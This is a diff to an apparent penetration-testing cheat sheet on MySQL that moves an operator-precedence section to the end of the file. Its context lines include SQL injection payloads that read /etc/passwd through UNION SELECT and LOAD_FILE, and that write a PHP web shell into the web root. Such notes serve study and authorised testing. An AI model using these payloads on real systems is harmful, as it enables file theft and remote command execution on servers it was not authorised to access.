@@ -34,14 +34,6 @@ title: MySQL
 | `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
 | `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |
 
-## MySQL Operator Precedence
->  Division (`/`), Multiplication (`*`), and Modulus (`%`)
-> Addition (`+`) and Subtraction (`-`)
-> Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
-> NOT (`!`)
-> AND (`&&`)
-> OR (`||`)
-
 ## SQL Injection
 
 ### Auth Bypass
@@ -85,3 +77,11 @@ title: MySQL
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
+
+## MySQL Operator Precedence
+>  Division (`/`), Multiplication (`*`), and Modulus (`%`)
+> Addition (`+`) and Subtraction (`-`)
+> Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
+> NOT (`!`)
+> AND (`&&`)
+> OR (`||`)
